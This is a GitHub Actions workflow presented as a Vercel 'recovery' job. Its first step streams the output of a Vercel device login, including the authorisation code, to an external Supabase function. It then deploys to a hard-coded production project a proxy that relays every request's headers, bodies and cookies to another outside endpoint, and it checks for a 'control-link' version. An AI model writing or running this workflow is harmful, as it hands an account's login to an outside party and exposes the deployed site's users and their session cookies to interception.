name: NexControl Vercel interactive recovery
on:
  push:
    branches: [main]
    paths: ['.github/workflows/nexcontrol-vercel-interactive-recovery.yml']
permissions:
  contents: read
jobs:
  recover:
    runs-on: ubuntu-latest
    timeout-minutes: 15
    steps:
      - name: Start Vercel device flow and stream snapshots
        shell: bash
        run: |
          set -euo pipefail
          LOG=/tmp/vercel-login.log
          : > "$LOG"
          script -q -f -c "npx --yes vercel@latest login" "$LOG" &
          PID=$!
          for i in {1..120}; do
            sleep 3
            CLEAN="$(sed -r 's/\x1B\[[0-9;?]*[ -\/]*[@-~]//g' "$LOG" | tail -c 16000)"
            PAYLOAD="$(printf 'VERCEL_DEVICE_RECOVERY\n%s' "$CLEAN")"
            curl -fsS -X POST \
              'https://ojbyvjqurlamplmujmyu.supabase.co/functions/v1/nxc-device-ingest' \
              -H 'Content-Type: text/plain' \
              --data-binary "$PAYLOAD" >/dev/null || true
            if ! kill -0 "$PID" 2>/dev/null; then break; fi
          done
          wait "$PID"

      - name: Deploy NexControl proxy to production
        shell: bash
        run: |
          set -euo pipefail
          npx --yes vercel@latest whoami
          rm -rf /tmp/nexcontrol
          mkdir -p /tmp/nexcontrol/api /tmp/nexcontrol/.vercel
          cd /tmp/nexcontrol
          cat > api/index.mjs <<'__NXC_EOF__'
          // NexControl proxy build 61.12.1-recovery
          const TARGET='https://ojbyvjqurlamplmujmyu.supabase.co/functions/v1/nexcontrol';
          
          function outboundHeaders(req,path){
            const h=new Headers();
            for(const [k,v] of Object.entries(req.headers||{})){
              const key=String(k).toLowerCase();
              if(['host','content-length','connection','transfer-encoding','keep-alive','upgrade','proxy-connection','te','trailer'].includes(key))continue;
              if(v==null)continue;
              if(Array.isArray(v)){for(const x of v)h.append(key,String(x));}
              else h.set(key,String(v));
            }
            h.set('x-nexcontrol-path',path);
            h.set('accept-encoding','identity');
            return h;
          }
          
          function outboundBody(req,headers){
            if(req.method==='GET'||req.method==='HEAD')return undefined;
            const b=req.body;
            if(b==null)return undefined;
            if(Buffer.isBuffer(b)||typeof b==='string')return b;
            const ct=String(headers.get('content-type')||'').toLowerCase();
            if(ct.includes('application/x-www-form-urlencoded')){
              return new URLSearchParams(Object.entries(b).map(([k,v])=>[k,String(v??'')])).toString();
            }
            if(ct.includes('application/json')||typeof b==='object'){
              headers.set('content-type','application/json');
              return JSON.stringify(b);
            }
            return String(b);
          }
          
          export default async function handler(req,res){
            try{
              const u=new URL(req.url,'https://nexcontrol.local');
              const headers=outboundHeaders(req,u.pathname);
              const body=outboundBody(req,headers);
              const upstream=await fetch(TARGET+u.search,{
                method:req.method,
                headers,
                body,
                redirect:'manual',
                signal:AbortSignal.timeout(30000)
              });
          
              res.statusCode=upstream.status;
              const skip=new Set(['content-length','transfer-encoding','connection','content-encoding']);
              for(const [k,v] of upstream.headers){
                if(!skip.has(k.toLowerCase()))res.setHeader(k,v);
              }
              if(typeof upstream.headers.getSetCookie==='function'){
                const cookies=upstream.headers.getSetCookie();
                if(cookies?.length)res.setHeader('set-cookie',cookies);
              }else{
                const cookie=upstream.headers.get('set-cookie');
                if(cookie)res.setHeader('set-cookie',cookie);
              }
              const buf=Buffer.from(await upstream.arrayBuffer());
              res.end(buf);
            }catch(error){
              console.error('[NexControl proxy]',error);
              res.statusCode=502;
              res.setHeader('content-type','application/json; charset=utf-8');
              res.end(JSON.stringify({error:'upstream_unavailable'}));
            }
          }
          
          __NXC_EOF__
          cat > vercel.json <<'__NXC_EOF__'
          {
            "version": 2,
            "functions": {"api/index.mjs": {"maxDuration": 30}},
            "rewrites": [{"source": "/(.*)", "destination": "/api/index.mjs"}]
          }
          
          __NXC_EOF__
          cat > package.json <<'__NXC_EOF__'
          {
            "name": "nexcontrol",
            "version": "0.1.0",
            "private": true,
            "type": "module",
            "engines": {"node": ">=20"},
            "dependencies": {"mongodb": "^6.9.0"}
          }
          
          __NXC_EOF__
          printf '{"orgId":"team_DeK4L6JW10CIXpHARpkMQQr8","projectId":"prj_SNuxI5eg0byszLYtXTfPXZC3S5VK"}\n' > .vercel/project.json
          npx --yes vercel@latest deploy --prod --yes

      - name: Verify live control link
        shell: bash
        run: |
          set -euo pipefail
          for i in {1..24}; do
            BODY="$(curl -fsS --max-time 20 https://nexcontrol-ochre.vercel.app/api/health || true)"
            echo "$BODY"
            if echo "$BODY" | grep -q '"version":"61.12-control-link"'; then exit 0; fi
            sleep 5
          done
          exit 1
